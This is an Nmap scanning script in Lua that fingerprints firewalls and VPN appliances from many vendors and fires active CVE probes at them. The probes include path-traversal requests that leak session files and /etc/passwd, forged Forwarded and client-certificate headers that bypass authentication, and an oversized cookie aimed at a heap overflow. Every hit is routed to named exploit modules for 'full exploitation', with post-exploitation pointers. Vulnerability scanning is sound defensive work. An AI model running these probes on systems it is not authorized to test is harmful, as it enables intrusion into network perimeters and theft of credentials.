-- embedxpl-perimeter-vuln.nse
-- EmbedXPL-Forge / FirewallXPL-Forge NSE Script
-- Perimeter Device CVE Fingerprinting and Vulnerability Check
--
-- Author : Andre Henrique (@mrhenrike) | Uniao Geek -- https://github.com/Uniao-Geek
-- Version: 1.0.0
-- License: Same as Nmap -- See https://nmap.org/book/man-legal.html
--
-- DESCRIPTION:
--   Fingerprints firewalls, VPN gateways, UTM appliances, and perimeter devices
--   from 12+ vendors. For each identified device, runs lightweight probes to
--   validate applicable CVEs. Reports VULNERABLE / POSSIBLY VULNERABLE / NOT
--   VULNERABLE and suggests the matching EmbedXPL-Forge or FirewallXPL-Forge
--   exploit module for full exploitation.
--
--   Covered vendors: Fortinet, Cisco ASA/FTD, Palo Alto, SonicWall, Sophos,
--   Juniper, Zyxel, pfSense, Check Point, WatchGuard, Ivanti, Barracuda
--
--   Covered CVEs (active probes):
--     CVE-2018-13379  -- FortiOS SSL-VPN path traversal (CVSS 9.8)
--     CVE-2022-40684  -- FortiOS REST API auth bypass (CVSS 9.8)
--     CVE-2022-42475  -- FortiOS SSL-VPN heap overflow pre-auth RCE (CVSS 9.8)
--     CVE-2023-27997  -- FortiOS SSL-VPN pre-auth heap overflow (CVSS 9.8)
--     CVE-2024-21762  -- FortiOS SSL-VPN OOB write pre-auth RCE (CVSS 9.6)
--     CVE-2024-55591  -- FortiOS WebSocket auth bypass super-admin (CVSS 9.8)
--     CVE-2023-48788  -- FortiClientEMS SQLi RCE (CVSS 9.8)
--     CVE-2026-35616  -- FortiClientEMS pre-auth API bypass (CVSS 9.1, CISA KEV)
--     CVE-2024-47575  -- FortiManager FortiJump pre-auth RCE (CVSS 9.8, CISA KEV)
--     CVE-2025-20362  -- Cisco ASA/FTD VPN URL bypass pre-auth (CISA KEV)
--     CVE-2025-20333  -- Cisco ASA/FTD VPN RCE post-auth (CVSS 9.9)
--     CVE-2023-20198  -- Cisco IOS XE Web UI priv escalation (CVSS 10.0)
--     CVE-2024-3400   -- Palo Alto PAN-OS GlobalProtect OS injection (CVSS 10.0)
--     CVE-2024-0012   -- Palo Alto PAN-OS mgmt auth bypass (CVSS 9.3)
--     CVE-2024-40766  -- SonicWall SSLVPN access control (CVSS 9.3)
--     CVE-2024-53704  -- SonicWall SSLVPN auth bypass (CVSS 9.8)
--     CVE-2023-3519   -- Citrix ADC/Gateway RCE (CVSS 9.8, CISA KEV)
--     CVE-2025-0282   -- Ivanti Connect Secure stack overflow RCE (CVSS 9.0, CISA KEV)
--     CVE-2024-24919  -- Check Point Information Disclosure (CVSS 8.6, CISA KEV)
--
-- USAGE:
--   nmap -p 443,8443,8080 --script embedxpl-perimeter-vuln <target>
--   nmap -sV --script embedxpl-perimeter-vuln 10.0.0.0/24
--   nmap -p 443 --script embedxpl-perimeter-vuln --script-args timeout=15 <target>
--
-- OUTPUT EXAMPLE:
--   443/tcp open  https
--   | embedxpl-perimeter-vuln:
--   |   Vendor         : Fortinet FortiGate
--   |   SSL-VPN portal : /remote/login (HTTP 200 -- accessible)
--   |   CVE-2018-13379 : VULNERABLE -- session file leaked via path traversal
--   |   CVE-2022-40684 : POSSIBLY VULNERABLE -- REST API endpoint exists
--   |   EmbedXPL module: exploits/firewalls/fortinet/fortios_sslvpn_path_traversal_cve_2018_13379
--   |   FirewallXPL    : exploits/perimeter/fortinet/fortios_sslvpn_path_traversal_cve_2018_13379
--   |_  Suite: embedxpl > use <module>  |  fxf > use <module>

local http   = require "http"
local nmap   = require "nmap"
local stdnse = require "stdnse"
local string = require "string"
local table  = require "table"

description = [[
Perimeter device CVE fingerprinting and active validation for firewalls, VPN gateways,
and UTM appliances. Identifies the vendor via HTTP response patterns, then probes each
applicable CVE. Reports exploitation status and the corresponding EmbedXPL-Forge and
FirewallXPL-Forge module path for full post-exploitation.
]]

author     = "Andre Henrique (@mrhenrike) | Uniao Geek"
license    = "Same as Nmap -- See https://nmap.org/book/man-legal.html"
categories = { "vuln", "safe", "discovery", "auth" }

portrule = function(host, port)
  return port.protocol == "tcp" and (
    port.number == 80    or
    port.number == 443   or
    port.number == 4443  or
    port.number == 8080  or
    port.number == 8443  or
    port.number == 8888  or
    port.number == 10443 or
    port.number == 4444  or
    port.number == 4990
  )
end

-- ── Timeout (override via --script-args timeout=N) ────────────────────────
local TIMEOUT_MS = tonumber(stdnse.get_script_args("timeout")) and
  (tonumber(stdnse.get_script_args("timeout")) * 1000) or 8000

-- ── Vendor fingerprint table ───────────────────────────────────────────────
-- Each entry: detect_paths (list), detect_patterns (any match), vendor name
local VENDOR_FINGERPRINTS = {
  {
    vendor = "Fortinet FortiGate / FortiOS",
    paths  = { "/remote/login", "/remote/logincheck", "/remote/info",
               "/api/v2/cmdb/system/global" },
    pats   = { "[Ff]ortinet", "[Ff]orti[Oo][Ss]", "[Ff]orti[Gg]ate",
               "fgt_lang", "sslvpn_logon_page", "remoteforward" },
  },
  {
    vendor = "Fortinet FortiClient EMS",
    paths  = { "/", "/api/v1/system/info", "/fct/endpointlist" },
    pats   = { "[Ff]orti[Cc]lient [Ee][Mm][Ss]", "fcems", "forticlientems",
               "[Ee]ndpoint [Mm]anagement" },
  },
  {
    vendor = "Fortinet FortiManager",
    paths  = { "/p/login/", "/jsonrpc", "/cgi-bin/module/login" },
    pats   = { "[Ff]orti[Mm]anager", "fmg", "FortiManager" },
  },
  {
    vendor = "Cisco ASA / FTD",
    paths  = { "/+CSCOE+/logon.html", "/+webvpn+/index.html",
               "/+CSCOE+/portal.html", "/CACHE/stc/" },
    pats   = { "[Cc]isco", "ASA", "AnyConnect", "CSCOE", "clientless",
               "Cisco SSL VPN" },
  },
  {
    vendor = "Cisco IOS XE",
    paths  = { "/webui", "/webui/logon.html", "/webui/login.html" },
    pats   = { "Cisco IOS XE", "IOS-XE", "iosxe", "Catalyst" },
  },
  {
    vendor = "Palo Alto Networks PAN-OS",
    paths  = { "/php/login.php", "/global-protect/login.esp",
               "/esp/login.esp", "/php/stats.php" },
    pats   = { "[Pp]alo [Aa]lto", "PAN%-OS", "GlobalProtect", "pan_form",
               "GpLoginPage" },
  },
  {
    vendor = "SonicWall",
    paths  = { "/auth.html", "/cgi-bin/welcome.cgi",
               "/dana-na/auth/url_default/welcome.cgi" },
    pats   = { "[Ss]onic[Ww]all", "SMA", "SonicOS", "NSA", "TZ Series" },
  },
  {
    vendor = "Sophos XG / UTM",
    paths  = { "/webconsole/", "/userportal/", "/login.html" },
    pats   = { "[Ss]ophos", "XG Firewall", "Astaro", "UTM" },
  },
  {
    vendor = "Juniper Networks",
    paths  = { "/dana-na/auth/url_default/welcome.cgi", "/remote/login" },
    pats   = { "[Jj]uniper", "Junos", "Pulse Secure", "SRX" },
  },
  {
    vendor = "Zyxel",
    paths  = { "/cgi-bin/login_handler.lua", "/maintenance/login/login.html" },
    pats   = { "[Zz]yxel", "ZyNOS", "USG", "ATP Series" },
  },
  {
    vendor = "Check Point",
    paths  = { "/sslvpn/Login/Login", "/portal/Login" },
    pats   = { "[Cc]heck[Pp]oint", "Check Point", "Gaia", "CPFW" },
  },
  {
    vendor = "Ivanti Connect Secure / Pulse",
    paths  = { "/dana-na/auth/url_default/welcome.cgi",
               "/dana/home/index.cgi" },
    pats   = { "[Ii]vanti", "[Pp]ulse [Ss]ecure", "Connect Secure",
               "dana%-na" },
  },
  {
    vendor = "Citrix ADC / NetScaler",
    paths  = { "/vpn/index.html", "/logon/LogonPoint/index.html" },
    pats   = { "[Cc]itrix", "NetScaler", "ADC", "Citrix Gateway" },
  },
  {
    vendor = "pfSense / OPNsense",
    paths  = { "/index.php", "/login.php", "/ui/login" },
    pats   = { "pfSense", "OPNsense", "FreeBSD" },
  },
  {
    vendor = "WatchGuard",
    paths  = { "/sslvpn_logon.shtml", "/logon.shtml" },
    pats   = { "[Ww]atch[Gg]uard", "FireboxV", "Firebox" },
  },
  {
    vendor = "Barracuda",
    paths  = { "/cgi-mod/index.cgi", "/index.cgi" },
    pats   = { "[Bb]arracuda", "CloudGen Firewall", "Email Security Gateway" },
  },
}

-- ── CVE probe definitions ──────────────────────────────────────────────────
-- Fields: cve, vendors (list), detect_path, probe_path, probe_method,
--         probe_body, probe_headers, vuln_pat, vuln_status, vuln_size_min,
--         cvss, cve_type, embedxpl_mod, firewallxpl_mod, notes
local CVE_PROBES = {

  -- ── Fortinet FortiOS ──────────────────────────────────────────────────
  {
    cve          = "CVE-2018-13379",
    vendors      = { "Fortinet FortiGate / FortiOS" },
    probe_path   = "/remote/fgt_lang?lang=../../../..//////////dev/cmdb/sslvpn_websession",
    probe_method = "GET",
    vuln_size_min= 20,
    vuln_pat     = "serialnumber\x00\x00\x00",
    cvss         = "9.8",
    cve_type     = "Path Traversal / Session Leak",
    embedxpl_mod = "exploits/firewalls/fortinet/fortios_sslvpn_path_traversal_cve_2018_13379",
    firewallxpl_mod = "exploits/perimeter/fortinet/fortios_sslvpn_path_traversal_cve_2018_13379",
    notes        = "Leaks sslvpn_websession binary file containing credentials",
  },
  {
    cve          = "CVE-2022-40684",
    vendors      = { "Fortinet FortiGate / FortiOS" },
    probe_path   = "/api/v2/cmdb/system/admin",
    probe_method = "GET",
    probe_headers = {
      ["User-Agent"]        = "Node.js",
      ["Forwarded"]         = 'by="[127.0.0.1]:80";for="[127.0.0.1]:49490";proto=http;host=',
      ["X-Forwarded-Vdom"]  = "root",
      ["Host"]              = "127.0.0.1:9980",
    },
    vuln_pat     = '"results"',
    vuln_status  = { 200 },
    cvss         = "9.8",
    cve_type     = "Auth Bypass (Forwarded header)",
    embedxpl_mod = "exploits/firewalls/fortinet/fortios_auth_bypass_cve_2022_40684",
    firewallxpl_mod = "exploits/perimeter/fortinet/fortios_auth_bypass_cve_2022_40684",
    notes        = "Trusts Forwarded: by=[127.0.0.1] header; grants unauthenticated admin REST API access",
  },
  {
    cve          = "CVE-2022-42475",
    vendors      = { "Fortinet FortiGate / FortiOS" },
    probe_path   = "/remote/logincheck",
    probe_method = "GET",
    probe_headers = { ["Cookie"] = "SVPNCOOKIE=" .. string.rep("A", 4096) },
    vuln_status  = { 200, 302, 500 },
    cvss         = "9.8",
    cve_type     = "Heap Overflow Pre-Auth RCE",
    embedxpl_mod = "exploits/firewalls/fortinet/fortios_sslvpn_heap_rce_cve_2022_42475",
    firewallxpl_mod = "exploits/perimeter/fortinet/fortios_sslvpn_heap_rce_cve_2022_42475",
    notes        = "Large Cookie triggers heap overflow in sslvpnd; binary exploit required for full RCE",
  },
  {
    cve          = "CVE-2024-21762",
    vendors      = { "Fortinet FortiGate / FortiOS" },
    probe_path   = "/remote/logincheck",
    probe_method = "GET",
    vuln_pat     = "fgt_lang",
    vuln_status  = { 200, 302 },
    cvss         = "9.6",
    cve_type     = "OOB Write Pre-Auth RCE (SSL-VPN)",
    embedxpl_mod = "exploits/firewalls/fortinet/fortios_sslvpn_rce_cve_2024_21762",
    firewallxpl_mod = "exploits/perimeter/fortinet/fortios_sslvpn_rce_cve_2024_21762",
    notes        = "SSL-VPN portal accessible -- version check needed for confirmation",
  },
  {
    cve          = "CVE-2024-55591",
    vendors      = { "Fortinet FortiGate / FortiOS" },
    probe_path   = "/proxy/WSS/",
    probe_method = "GET",
    probe_headers = {
      ["Connection"]             = "Upgrade",
      ["Upgrade"]                = "websocket",
      ["Sec-WebSocket-Version"]  = "13",
      ["Sec-WebSocket-Key"]      = "dGhlIHNhbXBsZSBub25jZQ==",
      ["User-Agent"]             = "FortiOS-WS/7.0 Node.js",
    },
    vuln_status  = { 101, 200, 400, 426 },
    cvss         = "9.8",
    cve_type     = "WebSocket Auth Bypass -> Super-Admin",
    embedxpl_mod = "exploits/firewalls/fortinet/fortios_websocket_auth_bypass_cve_2024_55591",
    firewallxpl_mod = "exploits/perimeter/fortinet/fortios_websocket_auth_bypass_cve_2024_55591",
    notes        = "Node.js WebSocket endpoint trusts forged JWT tokens; grants unauthenticated super_admin",
  },
  {
    cve          = "CVE-2023-48788",
    vendors      = { "Fortinet FortiClient EMS" },
    probe_path   = "/fct/endpointlist",
    probe_method = "GET",
    vuln_status  = { 200, 400, 500 },
    cvss         = "9.8",
    cve_type     = "SQLi -> xp_cmdshell RCE (EMS DAS)",
    embedxpl_mod = "exploits/firewalls/fortinet/forticlientems_sqli_rce_cve_2023_48788",
    firewallxpl_mod = "exploits/perimeter/fortinet/forticlientems_sqli_rce_cve_2023_48788",
    notes        = "DAS component /fct/endpointlist vulnerable to stacked SQL injection; enables xp_cmdshell",
  },
  {
    cve          = "CVE-2026-35616",
    vendors      = { "Fortinet FortiClient EMS" },
    probe_path   = "/api/v1/system/info",
    probe_method = "GET",
    probe_headers = {
      ["X-SSL-CLIENT-VERIFY"] = "SUCCESS",
      ["X-SSL-Client-Verify"] = "SUCCESS",
      ["X-SSL-Client-S-Dn"]  = "CN=FortiClient EMS, O=Fortinet Ltd., C=US",
      ["X-SSL-Client-I-Dn"]  = "CN=Fortinet CA, O=Fortinet Ltd., C=US",
      ["User-Agent"]         = "FortiClient/7.4.6 (Windows; EMS-Agent)",
    },
    vuln_pat     = '"serial_number"',
    vuln_status  = { 200 },
    cvss         = "9.1",
    cve_type     = "Pre-Auth API Bypass (Header Spoofing, CISA KEV 2026-04-06)",
    embedxpl_mod = "exploits/firewalls/fortinet/forticlient_ems_preauth_rce_cve_2026_35616",
    firewallxpl_mod = "exploits/perimeter/fortinet/forticlient_ems_preauth_api_bypass_cve_2026_35616",
    notes        = "Django middleware trusts X-SSL-CLIENT-VERIFY header; certificate validation is DN-only (no X.509 sig check). EKZ infostealer in-the-wild.",
  },
  {
    cve          = "CVE-2024-47575",
    vendors      = { "Fortinet FortiManager" },
    probe_path   = "/jsonrpc",
    probe_method = "POST",
    probe_body   = '{"method":"exec","params":[{"url":"/sys/login/user","data":{"user":"anonymous","passwd":""}}],"id":1}',
    probe_headers = { ["Content-Type"] = "application/json" },
    vuln_pat     = '"code":0',
    cvss         = "9.8",
    cve_type     = "Pre-Auth RCE FortiJump (CISA KEV 2024-10-23)",
    embedxpl_mod = "exploits/firewalls/fortinet/fortimanager_fortijump_cve_2024_47575",
    firewallxpl_mod = "exploits/perimeter/fortinet/fortimanager_fortijump_cve_2024_47575",
    notes        = "Missing authentication in fgfmsd daemon allows pre-auth code execution",
  },

  -- ── Cisco ASA / FTD ──────────────────────────────────────────────────
  {
    cve          = "CVE-2020-3452",
    vendors      = { "Cisco ASA / FTD" },
    probe_path   = "/+CSCOT+/translation-table?type=mst&textdomain=+CSCOE+/portal_inc.lua&default-language=&lang=../",
    probe_method = "GET",
    vuln_size_min= 100,
    cvss         = "7.5",
    cve_type     = "Path Traversal (WebVPN)",
    embedxpl_mod = "exploits/firewalls/cisco/asa_ftd_path_traversal_cve_2020_3452",
    firewallxpl_mod = "exploits/perimeter/cisco/asa_ftd_path_traversal_cve_2020_3452",
    notes        = "Reads files from WebVPN service directory via directory traversal",
  },
  {
    cve          = "CVE-2025-20362",
    vendors      = { "Cisco ASA / FTD" },
    probe_path   = "/+CSCOE+/files/file_list.json",
    probe_method = "GET",
    vuln_status  = { 200, 302 },
    cvss         = "9.1",
    cve_type     = "Pre-Auth Restricted URL Bypass (FIRESTARTER, CISA KEV)",
    embedxpl_mod = "exploits/firewalls/cisco/cisco_asa_ftd_firestarter_chain_cve_2025_20362_20333",
    firewallxpl_mod = "exploits/perimeter/cisco/cisco_asa_ftd_firestarter_chain_cve_2025_20362_20333",
    notes        = "UAT4356/ArcaneDoor APT (CISA AR26-113A). Chained with CVE-2025-20333 for full RCE. FIRESTARTER backdoor survives firmware update.",
  },
  {
    cve          = "CVE-2023-20198",
    vendors      = { "Cisco IOS XE" },
    probe_path   = "/webui/logon.html",
    probe_method = "GET",
    vuln_pat     = "IOS XE",
    vuln_status  = { 200, 302 },
    cvss         = "10.0",
    cve_type     = "Web UI Privilege Escalation (CVSS 10.0, CISA KEV)",
    embedxpl_mod = "exploits/firewalls/cisco/ios_xe_webui_privesc_cve_2023_20198",
    firewallxpl_mod = "exploits/perimeter/cisco/ios_xe_webui_privesc_cve_2023_20198",
    notes        = "Unauthenticated admin account creation via Web UI; level 15 access",
  },

  -- ── Palo Alto Networks ────────────────────────────────────────────────
  {
    cve          = "CVE-2024-3400",
    vendors      = { "Palo Alto Networks PAN-OS" },
    probe_path   = "/global-protect/portal/css/bootstrap.min.css",
    probe_method = "GET",
    vuln_pat     = "PAN%-OS",
    vuln_status  = { 200 },
    cvss         = "10.0",
    cve_type     = "GlobalProtect OS Command Injection Pre-Auth RCE (CVSS 10.0, CISA KEV)",
    embedxpl_mod = "exploits/firewalls/paloalto/panos_globalprotect_rce_cve_2024_3400",
    firewallxpl_mod = "exploits/perimeter/paloalto/panos_globalprotect_rce_cve_2024_3400",
    notes        = "Cookie SESSID injection in GlobalProtect gateway; file creation -> cron -> RCE as root",
  },
  {
    cve          = "CVE-2024-0012",
    vendors      = { "Palo Alto Networks PAN-OS" },
    probe_path   = "/php/login.php",
    probe_method = "GET",
    vuln_pat     = "PAN%-OS",
    vuln_status  = { 200, 302 },
    cvss         = "9.3",
    cve_type     = "Management Interface Auth Bypass (CISA KEV)",
    embedxpl_mod = "exploits/firewalls/paloalto/panos_mgmt_auth_bypass_cve_2024_0012",
    firewallxpl_mod = "exploits/perimeter/paloalto/panos_mgmt_auth_bypass_cve_2024_0012",
    notes        = "Chained with CVE-2024-9474 for RCE. Affects management interface only.",
  },

  -- ── SonicWall ─────────────────────────────────────────────────────────
  {
    cve          = "CVE-2024-40766",
    vendors      = { "SonicWall" },
    probe_path   = "/auth.html",
    probe_method = "GET",
    vuln_pat     = "[Ss]onic[Ww]all",
    vuln_status  = { 200 },
    cvss         = "9.3",
    cve_type     = "Improper Access Control (SSLVPN, CISA KEV)",
    embedxpl_mod = "exploits/firewalls/sonicwall/sonicwall_sslvpn_access_cve_2024_40766",
    firewallxpl_mod = "exploits/perimeter/sonicwall/sonicwall_sslvpn_access_cve_2024_40766",
    notes        = "SonicOS access control flaw; may allow unauthorized resource access and firewall crash",
  },
  {
    cve          = "CVE-2024-53704",
    vendors      = { "SonicWall" },
    probe_path   = "/cgi-bin/sslvpnclient",
    probe_method = "GET",
    vuln_status  = { 200, 302, 401 },
    cvss         = "9.8",
    cve_type     = "SSLVPN Auth Bypass (CVSS 9.8)",
    embedxpl_mod = "exploits/firewalls/sonicwall/sonicwall_sslvpn_auth_bypass_cve_2024_53704",
    firewallxpl_mod = "exploits/perimeter/sonicwall/sonicwall_sslvpn_auth_bypass_cve_2024_53704",
    notes        = "Improper authentication in SonicWall SonicOS SSLVPN; hijack sessions without credentials",
  },

  -- ── Ivanti ────────────────────────────────────────────────────────────
  {
    cve          = "CVE-2025-0282",
    vendors      = { "Ivanti Connect Secure / Pulse" },
    probe_path   = "/dana-na/auth/url_default/welcome.cgi",
    probe_method = "GET",
    vuln_pat     = "[Ii]vanti",
    vuln_status  = { 200, 302 },
    cvss         = "9.0",
    cve_type     = "Stack Overflow Pre-Auth RCE (CISA KEV 2025-01-08)",
    embedxpl_mod = "exploits/vpn/ivanti/ivanti_connect_secure_rce_cve_2025_0282",
    firewallxpl_mod = "exploits/vpn/ivanti_connect_secure_rce_cve_2025_0282",
    notes        = "Unauthenticated stack overflow in Ivanti Connect Secure 22.7R2.4 and earlier",
  },

  -- ── Citrix / Barracuda ────────────────────────────────────────────────
  {
    cve          = "CVE-2023-3519",
    vendors      = { "Citrix ADC / NetScaler" },
    probe_path   = "/vpn/../vpns/cfg/smb.conf",
    probe_method = "GET",
    vuln_size_min= 5,
    cvss         = "9.8",
    cve_type     = "Unauthenticated RCE (CISA KEV)",
    embedxpl_mod = "exploits/vpn/citrix/citrix_adc_gateway_rce_cve_2023_3519",
    firewallxpl_mod = "exploits/vpn/citrix_adc_gateway_rce_cve_2023_3519",
    notes        = "Affects Citrix ADC and Gateway when configured as gateway; pre-auth RCE",
  },
  {
    cve          = "CVE-2023-2868",
    vendors      = { "Barracuda" },
    probe_path   = "/cgi-mod/index.cgi",
    probe_method = "GET",
    vuln_pat     = "[Bb]arracuda",
    vuln_status  = { 200, 302 },
    cvss         = "9.4",
    cve_type     = "Email Security Gateway RCE (CISA KEV, in-the-wild)",
    embedxpl_mod = "exploits/waf/barracuda/barracuda_esg_rce_cve_2023_2868",
    firewallxpl_mod = "exploits/waf/barracuda_esg_rce_cve_2023_2868",
    notes        = "Tar archive attachment handling allows command injection; root RCE",
  },

  -- ── Check Point ───────────────────────────────────────────────────────
  {
    cve          = "CVE-2024-24919",
    vendors      = { "Check Point" },
    probe_path   = "/clients/MyCRL",
    probe_method = "POST",
    probe_body   = "aCSHELL/../../../../../../../etc/passwd",
    probe_headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
    vuln_pat     = "root:x:0:0",
    cvss         = "8.6",
    cve_type     = "Information Disclosure / Path Traversal (CISA KEV)",
    embedxpl_mod = "exploits/firewalls/checkpoint/checkpoint_vpn_path_traversal_cve_2024_24919",
    firewallxpl_mod = "exploits/perimeter/checkpoint/checkpoint_vpn_path_traversal_cve_2024_24919",
    notes        = "Allows reading arbitrary files including /etc/passwd, shadow, SSH keys; chaining leads to RCE",
  },

  -- ── Zyxel ─────────────────────────────────────────────────────────────
  {
    cve          = "CVE-2023-28771",
    vendors      = { "Zyxel" },
    probe_path   = "/cgi-bin/login_handler.lua",
    probe_method = "GET",
    vuln_pat     = "[Zz]yxel",
    vuln_status  = { 200, 401 },
    cvss         = "9.8",
    cve_type     = "Improper Error Handling OS Command Injection (CVSS 9.8)",
    embedxpl_mod = "exploits/firewalls/zyxel/zyxel_os_cmd_inject_cve_2023_28771",
    firewallxpl_mod = "exploits/perimeter/zyxel/zyxel_os_cmd_inject_cve_2023_28771",
    notes        = "Unauthenticated command injection via IKEv2 packet; affects ATP/USG/VPN series",
  },
}

-- ── Helper functions ───────────────────────────────────────────────────────

local function http_req(host, port, method, path, headers, body)
  local opts = { timeout = TIMEOUT_MS, header = headers or {} }
  if method == "POST" then
    return http.post(host, port, path, opts, body or "")
  elseif method == "PUT" then
    return http.put(host, port, path, opts, body or "")
  else
    return http.get(host, port, path, opts)
  end
end

local function matches_any(text, patterns)
  if not text then return false end
  for _, pat in ipairs(patterns) do
    if text:match(pat) then return true end
  end
  return false
end

-- Fingerprint vendor by probing known paths/patterns
local function identify_vendor(host, port)
  for _, fp in ipairs(VENDOR_FINGERPRINTS) do
    for _, path in ipairs(fp.paths) do
      local resp = http.get(host, port, path, { timeout = TIMEOUT_MS })
      if resp and resp.status and resp.status > 0 then
        local body = resp.body or ""
        local server = (resp.header and resp.header["server"]) or ""
        local combined = body .. server
        if matches_any(combined, fp.pats) then
          return fp.vendor, resp
        end
        -- Even if patterns don't match, a 200/401 on a device-specific path
        -- is a strong indicator (report as possible match)
        if (resp.status == 200 or resp.status == 401) and
           path:match("remote") or path:match("CSCOE") or path:match("fct") then
          -- Weak match -- return as candidate only if multiple paths respond
        end
      end
    end
  end
  return nil, nil
end

-- Run an active CVE probe and return a result string
local function probe_cve(host, port, entry)
  local resp = http_req(host, port, entry.probe_method,
    entry.probe_path, entry.probe_headers, entry.probe_body)
  if not resp then
    return "ERROR (timeout / no response)"
  end

  local body = resp.body or ""

  -- Check pattern match
  if entry.vuln_pat and body:match(entry.vuln_pat) then
    return ("VULNERABLE -- pattern match: '%s'"):format(entry.vuln_pat)
  end

  -- Check minimum response size (data exfil indicator)
  if entry.vuln_size_min and #body >= entry.vuln_size_min and resp.status == 200 then
    return ("VULNERABLE -- endpoint returned %d bytes without authentication (expected: none)"):format(#body)
  end

  -- Check status code
  if entry.vuln_status then
    for _, s in ipairs(entry.vuln_status) do
      if resp.status == s then
        return ("POSSIBLY VULNERABLE -- HTTP %d on %s (authentication may not be required)"):format(
          s, entry.probe_path)
      end
    end
  end

  if resp.status == 401 or resp.status == 403 then
    return ("ENDPOINT EXISTS (HTTP %d) -- credentials or further bypass required"):format(resp.status)
  end

  return ("NOT VULNERABLE -- HTTP %d"):format(resp.status or 0)
end

-- Format the suite recommendation block
local function suite_block(embedxpl_mod, firewallxpl_mod)
  local lines = {}
  if embedxpl_mod and embedxpl_mod ~= "" then
    table.insert(lines, "EmbedXPL-Forge : embedxpl > use " .. embedxpl_mod)
  end
  if firewallxpl_mod and firewallxpl_mod ~= "" then
    table.insert(lines, "FirewallXPL    : fxf > use " .. firewallxpl_mod)
  end
  return table.concat(lines, " | ")
end

-- ── Main action ───────────────────────────────────────────────────────────

action = function(host, port)
  -- Quick alive check
  local alive = http.get(host, port, "/", { timeout = TIMEOUT_MS })
  if not alive or not alive.status then return nil end

  local output = stdnse.output_table()

  -- Step 1: Vendor fingerprint
  local vendor, _banner_resp = identify_vendor(host, port)
  if not vendor then
    -- Try banner for generic Fortinet/Cisco/PA detection
    local body = alive.body or ""
    local server = (alive.header and alive.header["server"]) or ""
    local combined = body .. server
    if matches_any(combined, { "[Ff]ortinet", "[Ff]orti" }) then
      vendor = "Fortinet (generic)"
    elseif matches_any(combined, { "Cisco", "ASA", "CSCOE" }) then
      vendor = "Cisco (generic)"
    elseif matches_any(combined, { "Palo Alto", "PAN%-OS", "GlobalProtect" }) then
      vendor = "Palo Alto Networks (generic)"
    elseif matches_any(combined, { "[Ss]onic[Ww]all", "SonicOS" }) then
      vendor = "SonicWall (generic)"
    else
      return nil  -- Not a recognized perimeter device on this port
    end
  end

  output["Vendor"] = vendor

  -- Step 2: Run applicable CVE probes
  local vuln_count   = 0
  local tested_count = 0
  local cve_results  = {}

  for _, entry in ipairs(CVE_PROBES) do
    -- Check vendor applicability
    local applicable = false
    for _, v in ipairs(entry.vendors) do
      if vendor:match(v:match("^([^/]+)") or v) or
         vendor:lower():match(v:lower():sub(1, 8)) then
        applicable = true
        break
      end
    end
    -- Also probe if vendor is generic match for the vendor family
    if not applicable and vendor:match("generic") then
      if vendor:match("[Ff]ortinet") and entry.vendors[1]:match("[Ff]ortinet") then
        applicable = true
      elseif vendor:match("[Cc]isco") and entry.vendors[1]:match("[Cc]isco") then
        applicable = true
      elseif vendor:match("[Pp]alo") and entry.vendors[1]:match("[Pp]alo") then
        applicable = true
      elseif vendor:match("[Ss]onic") and entry.vendors[1]:match("[Ss]onic") then
        applicable = true
      end
    end

    if applicable then
      tested_count = tested_count + 1
      local result = probe_cve(host, port, entry)
      local key = ("%s (CVSS %s, %s)"):format(entry.cve, entry.cvss or "?", entry.cve_type)
      output[key] = result

      if result:match("VULNERABLE") then
        vuln_count = vuln_count + 1
        output["  -> Suite: " .. entry.cve] = suite_block(entry.embedxpl_mod, entry.firewallxpl_mod)
        if entry.notes and entry.notes ~= "" then
          output["  -> Notes: " .. entry.cve] = entry.notes
        end
      end
    end
  end

  -- Step 3: Summary
  if tested_count == 0 then
    return nil
  end

  output["CVEs tested"]    = tostring(tested_count)
  output["Confirmed/Possible vulns"] = tostring(vuln_count)

  if vuln_count > 0 then
    output["EXPLOITATION"] = "Target has exploitable CVEs -- see module paths above"
    output["EmbedXPL-Forge install"] = "pip install embedxpl && embedxpl"
    output["FirewallXPL-Forge install"] = "pip install firewallxpl && fxf"
  else
    output["Assessment"] = "No CVEs confirmed via active probes (may be patched or WAF-protected)"
    output["Manual validation"] = "Consider version-based checks: nmap -sV --version-intensity 7"
  end

  output["Suite"] = "EmbedXPL-Forge (broad): pip install embedxpl && embedxpl  |  FirewallXPL-Forge (perimeter specialist): pip install firewallxpl && fxf"
  output["EmbedXPL-Forge repo"]    = "https://github.com/mrhenrike/EmbedXPL-Forge"
  output["FirewallXPL-Forge repo"] = "https://github.com/mrhenrike/FirewallXPL-Forge"
  output["Post-exploitation"]      = "GTFOBins: https://gtfobins.github.io -- FortiOS shell: execute shell; Cisco: enable + show run"
  output["Suite reference"]        = "nmap --script embedxpl-suite-ref <target>"

  return output
end
